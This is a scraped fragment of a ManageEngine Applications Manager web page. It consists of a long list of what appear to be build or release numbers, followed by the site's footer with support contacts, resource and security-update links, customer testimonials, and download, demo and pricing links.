  16705
  16704
  16703
  16702
  16701
  16700
  16690
  16680
  16650
  16640
  16631
  16630
  16620
  16610
  16600
  16591
  16590
  16580
  16574
  16573
  16572
  16571
  16570
  16560
  16550
  16540
  16530
  16520
  16516
  16514
  16513
  16512
  16511
  16510
  16500
  16490
  16480
  16470
  16460
  16450
  16440
  16430
  16424
  16423
  16422
  16420
  16410
  16400
  16390
  16380
  16370
  16367
  16366
  16365
  16364
  16363
  16362
  16361
  16360
  16350
  16340
  16330
  16320
  16310
  16300
  16213
  16211
  16210
  16200
  16190
  16180
  16170
  16160
  16150
  16140
  16135
  16134
  16133
  16132
  16131
  16130
  16120
  16110
  16100
  16093
  16091
  16090
  16080
  16070
  16060
  16050
  16040
  16030
  16020
  16010
  16000
  15981
  15980
  15970
  15960
  15950
  15940
  15930
  15920
  15910
  15905
  15904
  15903
  15902
  15901
  15900
  15890
  15880
  15870
  15860
  15850
  15840
  15830
  15820
  15810
  15800
  15790
  15780
  15770
  15760
  15750
  15740
  15730
  15720
  15710
  15700
  15690
  15671
  15670
  15660
  15653
  15652
  15651
  15650
  15640
  15630
  15620
  15610
  15600
  15590
  15580
  15570
  15560
  15550
  15540
  15530
  15512
  15511
  15510
  15500
  15481
  15480
  15470
  15402
  15401
  15400
  15390
  15381
  15380
  15370
  15360
  15350
  15340
  15330
  15320
  15310
  15300
  15290
  15280
  15270
  15260
  15250
  15240
  15230
  15225
  15224
  15223
  15222
  15221
  15220
  15210
  15200
  15190
  15180
  15170
  15160
  15150
  15140
  15130
  15120
  15110
  15100
  15090
  15080
  15070
  15060
  15050
  15040
  15030
  15020
  15010
  15007
  15006
  15005
  15004
  15003
  15002
  15001
  15000
  14911
  14910
  14900
  14890
  14880
  14870
  14860
  14850
  14844
  14843
  14842
  14841
  14840
  14830
  14820
  14811
  14800
  14790
  14783
  14782
  14781
  14780
  14770
  14760
  14750
  14740
  14730
  14720
  14710
  14700
  14690
  14685
  14684
  14683
  14682
  14681
  14680
  14670
  14660
  14630
  14620
  14610
  14600
  14590
  14580
  14570
  14560
  14550
  14540
  14534
  14533
  14532
  14531
  14530
  14520
  14510
  14500
  14490
  14440
  14430
  14420
  14410
  14401
  14400
  14390
  14380
  14370
  14361
  14360
  14350
  14340
  14332
  14331
  14330
  14320
  14310
  14300
  14290
  14280
  14270
  14262
  14261
  14260
  14250
  14240
  14230
  14220
  14210
  14200
  14190
  14180
  14170
  14160
  14150
  14140
  14130
  14120
  14110
  14100
  14090
  14080
  14073
  14072
  14071
  14070
  14060
  14050
  14040
  14030
  14020
  14010
  14000
  13990
  13980
  13970
  13960
  13950
  13940
  13930
  13920
  13910
  13900
  13890
  13880
  13870
  13860
  13850
  13840
  13831
  13830
  13820
  13810
  13800
  13790
  13780
  13770
  13760
  13750
  13740
  13730
  13720
  13710
  13700
  13690
  13680
  13670
  13660
  13650
  13640
  13630
  13620
  13610
  13600
  13591
  13590
  13580
  13570
  13560
  13570
  13560
  13550
  13540
  13530
  13520
  13510
  13500
  13450
  13440
  13430
  13420
  13410
  13400
  13300
  13210
  13200
  13100
  13010
  13000
* [Roadmap &

  feature requests](https://www.manageengine.com/products/applications_manager/roadmap.html)

  [What's ahead in APM.

  Suggest a new feature.](https://www.manageengine.com/products/applications_manager/roadmap.html)
* [Community](https://pitstop.manageengine.com/portal/community/applications-manager)

  [Interact with other APM users

  and our product experts.](https://pitstop.manageengine.com/portal/community/applications-manager)
* Request a

   [Trial Extension](https://www.manageengine.com/products/applications_manager/trial_license_request.html)

   [Add-On License](https://www.manageengine.com/products/applications_manager/add-on-eval-licence.html)
* [Security Updates](../applications_manager/security-updates/security-updates.html)

  [Security Vulnerability fixes made in various releases.](../applications_manager/security-updates/security-updates.html)

* Sales :

  **sales@manageengine.com**

  Evaluation assistance :

  **eval-itom@manageengine.com**

  Technical Support :

  **appmanager-support@manageengine.com**
* Enquiries (toll free) :
  + USA: +1 888 720 9500 & +1-888-791-1189
  + UK: 0800 028 6590
  + Australia: 1800 631 268
  + India: 1800 572 6673
* Alternate numbers :
  + Intl: +1 925 924 9500
  + USA: +1 844 245 1106
  + Canada: +1 514 673 9946
  + China: +86 400 660 8680
  + India: +91-44-67447001 & 71817001
* Direct Inward Dialing :
  + Tel: +1 408 916 9494

* [![](images/icon-online-training.png) Free Training](https://www.manageengine.com/itom/free-training/applications-manager.html?support)
* [![](images/icon-documents.png) Resources](https://www.manageengine.com/products/applications_manager/document.html)
* [![](images/video_icon.gif) Product videos](https://www.youtube.com/channel/UCSYrBfiRCVxslgzHb2Myq8A/playlists)
* [![](images/admp-dl-supp.png) Customer Stories](https://www.manageengine.com/products/applications_manager/customer.html)
* [![](images/icon-documents.png) Help Guide](https://www.manageengine.com/products/applications_manager/help/)

## Loved by customers all over the world

 ![Gartner Peer Insights](images/footer/client-logo/gartner-peer-insights.svg)
#### "Standout Tool With Extensive Monitoring Capabilities"

 ‚òÖ ‚òÖ ‚òÖ ‚òÖ ‚òÖ

It allows us to track crucial metrics such as response times, resource utilization, error rates, and transaction performance. The real-time monitoring alerts promptly notify us of any issues or anomalies, enabling us to take immediate action.

Reviewer Role: Research and Development

 [![](images/footer/client/carlos-rivero.webp)](https://www.youtube.com/watch?v=d7Wbd6cUImY&t=1s)
##### "I like Applications Manager because it helps us to detect issues present in our servers and SQL databases."

###### Carlos Rivero

Tech Support Manager, Lexmark

##### Trusted by over 6000+ businesses globally

* [Download](download.html?btmMenu "Download ManageEngine Applications Manager")
* [Live Demo](http://demo.appmanager.com/jsp/SingleSignOn.jsp?clienttype2=html&username=demo&password=demo&demolanguage=EN)
* [Compare Editions](applications-manager-comparison.html?btmMenu)
* [Buy Now](https://store.manageengine.com/applications_manager/)
* [Pricing](https://www.manageengine.com/products/applications_manager/pricing.html?btmMenu)

* [Download](https://www.manageengine.com/products/applications_manager/download.html?utm_source=btmMenuapm "Download ManageEngine Applications Manager")
* [Request Demo](https://www.manageengine.com/products/applications_manager/get-quote.html?utm_source=btmMenuapm "Demo - ManageEngine Applications Manager")
* [Get Quote](https://www.manageengine.com/products/applications_manager/demo.html?utm_source=btmMenuapm "Get Quote ManageEngine Applications Manager")

  [#### The ultimate APM playbook: Master challenges, implement best practices

Download e-book

 ![The ultimate APM playbook](images/popup-banner/pop-promotion-img.webp)](https://www.manageengine.com/products/applications_manager/overcoming-roadblocks-and-mastering-best-practices-in-apm.html?apm-popup-banner)


